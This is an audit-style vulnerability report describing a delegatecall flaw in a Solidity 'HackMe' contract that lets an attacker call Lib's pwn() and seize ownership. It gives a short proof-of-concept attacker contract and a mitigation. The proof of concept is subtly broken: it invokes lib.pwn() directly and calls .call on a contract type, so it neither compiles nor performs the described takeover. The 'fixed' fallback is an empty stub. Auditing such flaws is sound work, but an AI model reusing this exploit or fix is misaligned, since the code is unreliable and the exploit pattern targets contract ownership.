# [H-01] Delegatecall Vulnerability in HackMe Contract
Submitted by Smart Auditor

HackMe.sol#L15-L18

The fallback function in the HackMe contract is vulnerable to a delegatecall attack due to the use of `delegatecall` with the `lib` contract's address. This allows an attacker to call the `pwn()` function in the `Lib` contract, which changes the `owner` of the `HackMe` contract.

```solidity
fallback() external payable {
    address(lib).delegatecall(msg.data);
}
```

## Proof of Concept

An attacker can create a malicious contract that calls the `pwn()` function in the `Lib` contract, allowing them to change the `owner` of the `HackMe` contract.

```solidity
contract MaliciousContract {
    HackMe public hackMe;
    Lib public lib;

    constructor(HackMe _hackMe, Lib _lib) {
        hackMe = _hackMe;
        lib = _lib;
    }

    function attack() public {
        lib.pwn();
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
```

## Recommended Mitigation Steps

To fix the delegatecall vulnerability, avoid using `delegatecall` in the fallback function. Instead, implement proper access control and only allow specific functions to be called by authorized users. This will prevent the attacker from changing the `owner` of the `HackMe` contract.

Here's the updated fallback function:

```solidity
fallback() external payable {
    // Implement proper access control and allowed functions
}
```

Additionally, consider using the OpenZeppelin library's Ownable and AccessControl contracts to manage ownership and access control in a secure and standardized way.